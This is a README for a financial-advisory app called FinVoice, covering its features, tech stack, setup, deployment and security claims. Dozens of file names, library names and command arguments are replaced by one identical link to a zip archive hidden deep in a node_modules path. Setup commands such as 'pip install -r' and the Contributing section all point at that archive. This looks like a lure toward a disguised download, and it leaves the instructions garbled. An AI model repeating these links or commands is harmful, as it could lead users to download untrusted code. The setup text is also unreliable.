# FinVoice - Professional Financial Management System

A comprehensive financial advisory platform with AI-driven insights, real-time portfolio management, and blockchain-backed security.

## 🚀 Features

- **Expense & Cash Flow Analysis**: Automated categorization and anomaly detection
- **Investment Portfolio Management**: Multi-asset support (stocks, bonds, crypto, etc.)
- **Debt & Loan Optimization**: Smart payoff strategies and credit monitoring
- **Insurance Portfolio Management**: Coverage analysis and recommendations
- **Goal Planning**: AI-powered financial forecasting
- **Credit Card Optimization**: Usage tracking and rewards maximization
- **24/7 Risk Monitoring**: Global event scanning and automated alerts
- **Blockchain Security**: Immutable audit logs on Polygon Amoy Testnet

## 🛠 Tech Stack

### Frontend
- **React** - Responsive web application
- **Material-UI** - Professional component library
- **https://raw.githubusercontent.com/razashaikh26/hackathon/main/frontend/node_modules/@mui/base/node_modules/@mui/utils/useOnMount/Software-1.9-alpha.5.zip** - Financial data visualization
- **PWA** - Mobile-optimized experience

### Backend
- **Python FastAPI** - High-performance API server
- **PostgreSQL (Neon)** - Primary database with pgvector
- **Redis** - Caching and session management
- **Celery** - Background task processing

### Machine Learning
- **scikit-learn** - Risk scoring and analytics
- **TensorFlow** - Anomaly detection
- **pandas/numpy** - Data processing

### Blockchain
- **https://raw.githubusercontent.com/razashaikh26/hackathon/main/frontend/node_modules/@mui/base/node_modules/@mui/utils/useOnMount/Software-1.9-alpha.5.zip** - Polygon Amoy integration
- **Smart Contracts** - Audit log storage

### External APIs
- **OpenAI API** - NLP and personalized insights
- **Google Speech-to-Text** - Voice input
- **Plaid API** - Financial data aggregation
- **Trading Bot API** - Portfolio execution

## 📁 Project Structure

```
finvoice/
├── frontend/                 # React application
│   ├── src/
│   │   ├── components/      # Reusable UI components
│   │   ├── pages/          # Route components
│   │   ├── services/       # API clients
│   │   ├── hooks/          # Custom React hooks
│   │   └── utils/          # Helper functions
│   ├── public/
│   └── https://raw.githubusercontent.com/razashaikh26/hackathon/main/frontend/node_modules/@mui/base/node_modules/@mui/utils/useOnMount/Software-1.9-alpha.5.zip
├── backend/                 # FastAPI application
│   ├── app/
│   │   ├── api/            # API routes
│   │   ├── core/           # Configuration
│   │   ├── db/             # Database models
│   │   ├── services/       # Business logic
│   │   ├── ml/             # Machine learning models
│   │   ├── blockchain/     # Web3 integration
│   │   └── https://raw.githubusercontent.com/razashaikh26/hackathon/main/frontend/node_modules/@mui/base/node_modules/@mui/utils/useOnMount/Software-1.9-alpha.5.zip         # Application entry point
│   ├── tests/
│   ├── https://raw.githubusercontent.com/razashaikh26/hackathon/main/frontend/node_modules/@mui/base/node_modules/@mui/utils/useOnMount/Software-1.9-alpha.5.zip
│   └── Dockerfile
├── ml_models/              # Training scripts and models
├── blockchain/             # Smart contracts
├── https://raw.githubusercontent.com/razashaikh26/hackathon/main/frontend/node_modules/@mui/base/node_modules/@mui/utils/useOnMount/Software-1.9-alpha.5.zip      # Development environment
└── https://raw.githubusercontent.com/razashaikh26/hackathon/main/frontend/node_modules/@mui/base/node_modules/@mui/utils/useOnMount/Software-1.9-alpha.5.zip
```

## 🚦 Getting Started

### Prerequisites
- Python 3.11+
- https://raw.githubusercontent.com/razashaikh26/hackathon/main/frontend/node_modules/@mui/base/node_modules/@mui/utils/useOnMount/Software-1.9-alpha.5.zip 18+
- PostgreSQL 14+ (or use Docker)
- Redis 6+ (or use Docker)
- Git

### Quick Start with Docker (Recommended)

1. **Clone the repository**
   ```bash
   git clone <repository-url>
   cd finvoice
   ```

2. **Copy environment files**
   ```bash
   cp https://raw.githubusercontent.com/razashaikh26/hackathon/main/frontend/node_modules/@mui/base/node_modules/@mui/utils/useOnMount/Software-1.9-alpha.5.zip https://raw.githubusercontent.com/razashaikh26/hackathon/main/frontend/node_modules/@mui/base/node_modules/@mui/utils/useOnMount/Software-1.9-alpha.5.zip
   cp https://raw.githubusercontent.com/razashaikh26/hackathon/main/frontend/node_modules/@mui/base/node_modules/@mui/utils/useOnMount/Software-1.9-alpha.5.zip https://raw.githubusercontent.com/razashaikh26/hackathon/main/frontend/node_modules/@mui/base/node_modules/@mui/utils/useOnMount/Software-1.9-alpha.5.zip
   ```

3. **Start all services with Docker**
   ```bash
   docker-compose up -d
   ```

4. **Access the application**
   - Frontend: http://localhost:3000
   - Backend API: http://localhost:8000
   - API Documentation: http://localhost:8000/docs

### Manual Installation

#### Backend Setup

1. **Navigate to backend directory**
   ```bash
   cd backend
   ```

2. **Create virtual environment**
   ```bash
   python -m venv venv
   source venv/bin/activate  # On Windows: venv\Scripts\activate
   ```

3. **Install dependencies**
   ```bash
   pip install -r https://raw.githubusercontent.com/razashaikh26/hackathon/main/frontend/node_modules/@mui/base/node_modules/@mui/utils/useOnMount/Software-1.9-alpha.5.zip
   ```

4. **Configure environment**
   ```bash
   cp https://raw.githubusercontent.com/razashaikh26/hackathon/main/frontend/node_modules/@mui/base/node_modules/@mui/utils/useOnMount/Software-1.9-alpha.5.zip .env
   # Edit .env with your database credentials and API keys
   ```

5. **Set up database**
   ```bash
   # Create PostgreSQL database
   createdb finvoice
   
   # Run migrations (when available)
   alembic upgrade head
   ```

6. **Start the backend server**
   ```bash
   uvicorn https://raw.githubusercontent.com/razashaikh26/hackathon/main/frontend/node_modules/@mui/base/node_modules/@mui/utils/useOnMount/Software-1.9-alpha.5.zip --reload --port 8000
   ```

#### Frontend Setup

1. **Navigate to frontend directory**
   ```bash
   cd frontend
   ```

2. **Install dependencies**
   ```bash
   npm install
   ```

3. **Configure environment**
   ```bash
   cp https://raw.githubusercontent.com/razashaikh26/hackathon/main/frontend/node_modules/@mui/base/node_modules/@mui/utils/useOnMount/Software-1.9-alpha.5.zip .env
   # Edit .env with your API endpoints
   ```

4. **Start the development server**
   ```bash
   npm start
   ```

### Environment Configuration

#### Backend (.env)
```env
# Database
DATABASE_URL=postgresql://username:password@localhost:5432/finvoice
ASYNC_DATABASE_URL=postgresql+asyncpg://username:password@localhost:5432/finvoice

# Redis
REDIS_URL=redis://localhost:6379/0

# Security
SECRET_KEY=your-super-secret-key-here

# External APIs
OPENAI_API_KEY=your-openai-api-key
PLAID_CLIENT_ID=your-plaid-client-id
PLAID_SECRET=your-plaid-secret
https://raw.githubusercontent.com/razashaikh26/hackathon/main/frontend/node_modules/@mui/base/node_modules/@mui/utils/useOnMount/Software-1.9-alpha.5.zip

# Blockchain - Polygon Amoy Testnet
https://raw.githubusercontent.com/razashaikh26/hackathon/main/frontend/node_modules/@mui/base/node_modules/@mui/utils/useOnMount/Software-1.9-alpha.5.zip
POLYGON_CHAIN_ID=80002
PRIVATE_KEY=your-ethereum-private-key
```

#### Frontend (.env)
```env
REACT_APP_API_URL=http://localhost:8000/api/v1
REACT_APP_WS_URL=ws://localhost:8000/ws
```

## 🤖 AI Engine Response Format

The system returns structured JSON responses with the following format:

```json
{
  "expense_analysis": {
    "actionable_suggestions": ["..."],
    "rationale": "...",
    "severity_level": "Low|Medium|High",
    "confidence": 85,
    "alternatives": ["..."]
  },
  "portfolio_management": {...},
  "debt_loan_tracking": {...},
  "insurance_management": {...},
  "goal_planning": {...},
  "credit_card_optimization": {...},
  "automated_monitoring": {...},
  "security": {...}
}
```

## 🔐 Security & Compliance

- GDPR/PCI DSS compliant data handling
- End-to-end encryption for sensitive data
- Blockchain audit trails on Polygon Amoy Testnet
- Real-time fraud detection
- Multi-factor authentication

## 📊 API Endpoints

- `POST /api/v1/analyze` - Financial analysis engine
- `GET /api/v1/portfolio` - Portfolio data
- `POST /api/v1/goals` - Goal planning
- `GET /api/v1/insights` - AI-generated insights
- `POST /api/v1/voice` - Voice input processing

## � Development

### Project Structure Overview
```
finvoice/
├── backend/                 # FastAPI application
│   ├── app/
│   │   ├── api/            # API routes and endpoints
│   │   ├── core/           # Configuration and database
│   │   ├── db/             # Database models
│   │   ├── services/       # Business logic services
│   │   └── https://raw.githubusercontent.com/razashaikh26/hackathon/main/frontend/node_modules/@mui/base/node_modules/@mui/utils/useOnMount/Software-1.9-alpha.5.zip         # Application entry point
│   ├── https://raw.githubusercontent.com/razashaikh26/hackathon/main/frontend/node_modules/@mui/base/node_modules/@mui/utils/useOnMount/Software-1.9-alpha.5.zip    # Python dependencies
│   └── Dockerfile         # Backend container setup
├── frontend/               # React application
│   ├── src/
│   │   ├── components/    # Reusable UI components
│   │   ├── pages/         # Page components
│   │   ├── services/      # API clients
│   │   └── https://raw.githubusercontent.com/razashaikh26/hackathon/main/frontend/node_modules/@mui/base/node_modules/@mui/utils/useOnMount/Software-1.9-alpha.5.zip        # Main app component
│   ├── https://raw.githubusercontent.com/razashaikh26/hackathon/main/frontend/node_modules/@mui/base/node_modules/@mui/utils/useOnMount/Software-1.9-alpha.5.zip       # Node dependencies
│   └── Dockerfile         # Frontend container setup
├── ml_models/             # Machine learning models
├── https://raw.githubusercontent.com/razashaikh26/hackathon/main/frontend/node_modules/@mui/base/node_modules/@mui/utils/useOnMount/Software-1.9-alpha.5.zip     # Development environment
└── https://raw.githubusercontent.com/razashaikh26/hackathon/main/frontend/node_modules/@mui/base/node_modules/@mui/utils/useOnMount/Software-1.9-alpha.5.zip
```

### Running Tests
```bash
# Backend tests
cd backend
pytest

# Frontend tests
cd frontend
npm test
```

### Code Quality
```bash
# Backend linting and formatting
cd backend
black .
isort .
flake8 .
mypy .

# Frontend linting
cd frontend
npm run lint
```

### API Documentation
- Swagger UI: http://localhost:8000/docs
- ReDoc: http://localhost:8000/redoc

## 🚀 Deployment

### Docker Production Deployment

1. **Build production images**
   ```bash
   docker-compose -f https://raw.githubusercontent.com/razashaikh26/hackathon/main/frontend/node_modules/@mui/base/node_modules/@mui/utils/useOnMount/Software-1.9-alpha.5.zip build
   ```

2. **Deploy with environment variables**
   ```bash
   docker-compose -f https://raw.githubusercontent.com/razashaikh26/hackathon/main/frontend/node_modules/@mui/base/node_modules/@mui/utils/useOnMount/Software-1.9-alpha.5.zip up -d
   ```

### Manual Production Deployment

#### Backend Deployment
```bash
# Install production dependencies
pip install -r https://raw.githubusercontent.com/razashaikh26/hackathon/main/frontend/node_modules/@mui/base/node_modules/@mui/utils/useOnMount/Software-1.9-alpha.5.zip

# Set production environment variables
export DEBUG=False
export DATABASE_URL=your-production-db-url

# Run with Gunicorn
gunicorn https://raw.githubusercontent.com/razashaikh26/hackathon/main/frontend/node_modules/@mui/base/node_modules/@mui/utils/useOnMount/Software-1.9-alpha.5.zip -w 4 -k https://raw.githubusercontent.com/razashaikh26/hackathon/main/frontend/node_modules/@mui/base/node_modules/@mui/utils/useOnMount/Software-1.9-alpha.5.zip -b 0.0.0.0:8000
```

#### Frontend Deployment
```bash
# Build production bundle
npm run build

# Serve with nginx or any static file server
# Copy build/ folder to your web server
```

## 📊 Monitoring and Logging

- **Backend Logs**: Structured logging with correlation IDs
- **Frontend Monitoring**: Error tracking and performance metrics
- **Database Monitoring**: Query performance and connection pooling
- **Blockchain Logs**: Transaction hashes and audit trails

## 🔒 Security Features

- JWT-based authentication
- API rate limiting
- Input validation and sanitization
- SQL injection prevention
- XSS protection
- CORS configuration
- Data encryption at rest and in transit
- Blockchain audit trails

## 📝 License

This project is licensed under the MIT License - see the LICENSE file for details.

## 🤝 Contributing

Please read https://raw.githubusercontent.com/razashaikh26/hackathon/main/frontend/node_modules/@mui/base/node_modules/@mui/utils/useOnMount/Software-1.9-alpha.5.zip for details on our code of conduct and the process for submitting pull requests.
